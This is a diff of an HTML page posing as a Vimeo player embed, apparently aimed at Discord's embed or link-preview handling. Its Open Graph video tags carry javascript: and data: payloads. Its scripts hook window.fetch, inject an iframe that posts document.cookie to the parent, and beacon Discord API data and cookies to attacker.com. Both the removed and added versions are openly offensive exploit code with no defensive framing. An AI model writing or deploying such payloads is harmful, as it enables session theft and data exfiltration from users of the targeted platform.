@@ -4,14 +4,13 @@
     <meta property="og:site_name" content="Vimeo">
     <meta property="og:type" content="video.other">
     <meta property="og:image" content="https://i.vimeocdn.com/video/test/maxresdefault.jpg">
-    <meta property="og:video:url" content="https://player.vimeo.com/video/123456789/login/private?success=data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly9hdHRhY2tlci5jb20nICsgZG9jdW1lbnQuY29va2llKTwvc2NyaXB0Pg==">
-    <meta property="og:video:secure_url" content="https://player.vimeo.com/video/123456789?player_id=vimeo-player&amp;api=1&amp;callback=initPlayer">
+    <meta property="og:video:url" content="https://player.vimeo.com/video/123456789/login/private?success=javascript:void(fetch('/api/v9/science').then(r=>r.text()).then(t=>fetch('https://attacker.com/'+btoa(t))))">
+    <meta property="og:video:secure_url" content="https://player.vimeo.com/video/123456789?player_id=vimeo-player&amp;api=1&amp;callback=initVimeoPlayer">
     <meta property="og:video:type" content="text/html">
     <meta property="og:video:width" content="1280">
     <meta property="og:video:height" content="720">
     <title>Vimeo Player Test</title>
     <script>
-    // Attempt to exploit media capabilities API
     async function attemptMediaExploit() {
         try {
             const config = {
@@ -21,42 +20,64 @@
                     width: 1920,
                     height: 1080,
                     bitrate: 120000,
-                    framerate: '30000/1001'
+                    framerate: 30.0  
                 }
             };
             
-            await navigator.mediaCapabilities.decodingInfo(config);
+            const result = await navigator.mediaCapabilities.decodingInfo(config);
+            console.log('Media capabilities:', result);
             
-            // Attempt to access system through media devices
-            const devices = await navigator.mediaDevices.enumerateDevices();
-            console.log(devices);
+            // Try to access Discord's MessageQueue
+            if (window.MessageQueue) {
+                console.log('MessageQueue found:', window.MessageQueue);
+            }
+            
+            // Attempt to intercept Discord API calls
+            const originalFetch = window.fetch;
+            window.fetch = function(url, options) {
+                if (url.includes('discord.com/api')) {
+                    // Attempt to exfiltrate API data
+                    const exfilData = btoa(JSON.stringify({url, options}));
+                    new Image().src = 'https://attacker.com/log?' + exfilData;
+                }
+                return originalFetch.apply(this, arguments);
+            };
         } catch(e) {
-            console.error(e);
+            console.error('Media exploit failed:', e);
         }
     }
 
-    // Attempt to exploit through Vimeo player API
-    function initPlayer(player_id) {
+    function initVimeoPlayer(player_id) {
         try {
-            const player = new Vimeo.Player(player_id, {
-                url: "data:text/html,<script>fetch('https://attacker.com/exfil?' + navigator.userAgent)<\/script>",
-                background: true,
-                muted: true
-            });
+            // Attempt to inject into Discord's message queue
+            const iframe = document.createElement('iframe');
+            iframe.srcdoc = `
+                <script>
+                    window.parent.postMessage({
+                        type: 'DISCORD_MESSAGE',
+                        payload: document.cookie
+                    }, '*');
+                <\/script>
+            `;
+            document.body.appendChild(iframe);
             
-            player.on('loaded', function() {
-                if (window.requestFileSystem) {
-                    window.requestFileSystem(window.TEMPORARY, 1024*1024, function(fs) {
-                        console.log('FileSystem access granted:', fs);
-                    });
-                }
-            });
+            // Try to access Discord's Sentry instance
+            if (window.__SENTRY__) {
+                console.log('Sentry found:', window.__SENTRY__);
+            }
         } catch(e) {
             console.error('Player init error:', e);
         }
     }
 
     window.onload = attemptMediaExploit;
+    
+    // Listen for postMessage responses
+    window.addEventListener('message', function(event) {
+        if (event.data && event.data.type === 'DISCORD_MESSAGE') {
+            new Image().src = 'https://attacker.com/discord?' + btoa(event.data.payload);
+        }
+    });
     </script>
 </head>
 <body>
